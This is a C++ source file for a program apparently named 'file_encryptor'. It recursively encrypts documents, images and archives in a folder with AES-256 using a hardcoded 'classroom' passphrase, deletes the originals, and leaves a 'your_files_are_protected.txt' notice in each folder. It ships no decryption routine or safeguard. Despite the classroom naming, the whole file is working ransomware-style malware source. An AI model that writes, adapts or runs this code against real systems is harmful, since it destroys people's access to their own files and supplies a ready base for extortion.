#include <algorithm>
#include <cctype>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <set>
#include <stdexcept>
#include <string>
#include <vector>

namespace fs = std::filesystem;

using ByteVector = std::vector<unsigned char>;

constexpr unsigned char kMagicHeader[] = {'A', 'E', 'S', 'F'};
constexpr std::size_t kIvSize = 16;
constexpr std::size_t kKeySize = 32;
const std::string kClassroomPassphrase = "N7v!Q2x@L5r#T9m$C4p%H8z&K1w*D6y";
const std::string kNoticeFileName = "your_files_are_protected.txt";
const std::string kNoticeText = "Your files are protected :)";
const std::vector<std::string> kProtectedExtensions = {
    ".txt", ".pdf", ".doc", ".docx",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp",
    ".zip"
};

ByteVector read_binary_file(const fs::path& file_path) {
    std::ifstream input(file_path, std::ios::binary);
    if (!input) {
        throw std::runtime_error("Could not open file: " + file_path.string());
    }

    return ByteVector((std::istreambuf_iterator<char>(input)),
                      std::istreambuf_iterator<char>());
}

void write_binary_file(const fs::path& file_path, const ByteVector& data) {
    std::ofstream output(file_path, std::ios::binary);
    if (!output) {
        throw std::runtime_error("Could not write file: " + file_path.string());
    }

    output.write(reinterpret_cast<const char*>(data.data()),
                 static_cast<std::streamsize>(data.size()));
}

ByteVector derive_key_from_passphrase(const std::string& passphrase) {
    if (passphrase.empty()) {
        throw std::invalid_argument("The passphrase must not be empty.");
    }

    ByteVector key(kKeySize);
    SHA256(reinterpret_cast<const unsigned char*>(passphrase.data()),
           passphrase.size(),
           key.data());
    return key;
}

ByteVector aes_encrypt_bytes(const ByteVector& plaintext,
                             const ByteVector& key,
                             const ByteVector& iv) {
    EVP_CIPHER_CTX* context = EVP_CIPHER_CTX_new();
    if (!context) {
        throw std::runtime_error("Could not create the encryption context.");
    }

    ByteVector ciphertext(plaintext.size() + EVP_MAX_BLOCK_LENGTH);
    int bytes_written = 0;
    int total_bytes = 0;

    if (EVP_EncryptInit_ex(context, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(context);
        throw std::runtime_error("EVP_EncryptInit_ex failed.");
    }

    if (EVP_EncryptUpdate(context,
                          ciphertext.data(),
                          &bytes_written,
                          plaintext.data(),
                          static_cast<int>(plaintext.size())) != 1) {
        EVP_CIPHER_CTX_free(context);
        throw std::runtime_error("EVP_EncryptUpdate failed.");
    }

    total_bytes += bytes_written;

    if (EVP_EncryptFinal_ex(context, ciphertext.data() + total_bytes, &bytes_written) != 1) {
        EVP_CIPHER_CTX_free(context);
        throw std::runtime_error("EVP_EncryptFinal_ex failed.");
    }

    total_bytes += bytes_written;
    ciphertext.resize(static_cast<std::size_t>(total_bytes));

    EVP_CIPHER_CTX_free(context);
    return ciphertext;
}

ByteVector generate_random_iv() {
    ByteVector iv(kIvSize);

    if (RAND_bytes(iv.data(), static_cast<int>(iv.size())) != 1) {
        throw std::runtime_error("Could not generate a random IV.");
    }

    return iv;
}

bool is_encrypted_file(const fs::path& file_path) {
    return file_path.extension() == ".enc";
}

bool is_notice_file(const fs::path& file_path) {
    return file_path.filename() == kNoticeFileName;
}

std::string lowercase_extension(const fs::path& file_path) {
    std::string extension = file_path.extension().string();
    std::transform(extension.begin(), extension.end(), extension.begin(),
                   [](unsigned char character) {
                       return static_cast<char>(std::tolower(character));
                   });
    return extension;
}

bool has_protected_extension(const fs::path& file_path) {
    const std::string extension = lowercase_extension(file_path);
    return std::find(kProtectedExtensions.begin(),
                     kProtectedExtensions.end(),
                     extension) != kProtectedExtensions.end();
}

fs::path encrypted_path_for(const fs::path& file_path) {
    return file_path.string() + ".enc";
}

void create_notice_file(const fs::path& folder_path) {
    const fs::path notice_path = folder_path / kNoticeFileName;
    std::ofstream output(notice_path, std::ios::binary);
    if (!output) {
        throw std::runtime_error("Could not create notice file: " + notice_path.string());
    }

    output << kNoticeText << '\n';
}

void encrypt_file(const fs::path& file_path, const ByteVector& key) {
    ByteVector plaintext = read_binary_file(file_path);
    ByteVector iv = generate_random_iv();
    ByteVector ciphertext = aes_encrypt_bytes(plaintext, key, iv);

    ByteVector output;
    output.insert(output.end(), std::begin(kMagicHeader), std::end(kMagicHeader));
    output.insert(output.end(), iv.begin(), iv.end());
    output.insert(output.end(), ciphertext.begin(), ciphertext.end());

    fs::path output_path = encrypted_path_for(file_path);
    write_binary_file(output_path, output);
    fs::remove(file_path);

    std::cout << "Encrypted: " << file_path << " -> " << output_path << '\n';
}

void encrypt_folder(const fs::path& root_path, const ByteVector& key) {
    std::set<fs::path> protected_folders;

    for (const auto& entry : fs::recursive_directory_iterator(root_path)) {
        if (!entry.is_regular_file()) {
            continue;
        }

        if (is_encrypted_file(entry.path())) {
            continue;
        }

        if (is_notice_file(entry.path())) {
            continue;
        }

        if (!has_protected_extension(entry.path())) {
            continue;
        }

        encrypt_file(entry.path(), key);
        protected_folders.insert(entry.path().parent_path());
    }

    for (const auto& folder_path : protected_folders) {
        create_notice_file(folder_path);
        std::cout << "Created notice: " << (folder_path / kNoticeFileName) << '\n';
    }
}

void print_usage() {
    std::cout << "Usage:\n"
              << "  file_encryptor [folder]\n";
}

int main(int argc, char* argv[]) {
    if (argc > 2) {
        print_usage();
        return 1;
    }

    const fs::path root_path = (argc == 2) ? fs::path(argv[1]) : fs::current_path();

    try {
        if (!fs::exists(root_path) || !fs::is_directory(root_path)) {
            throw std::runtime_error("The target folder does not exist or is not a directory.");
        }

        ByteVector key = derive_key_from_passphrase(kClassroomPassphrase);
        encrypt_folder(root_path, key);
        std::cout << "Folder encryption completed.\n";
    } catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << '\n';
        return 1;
    }

    return 0;
}
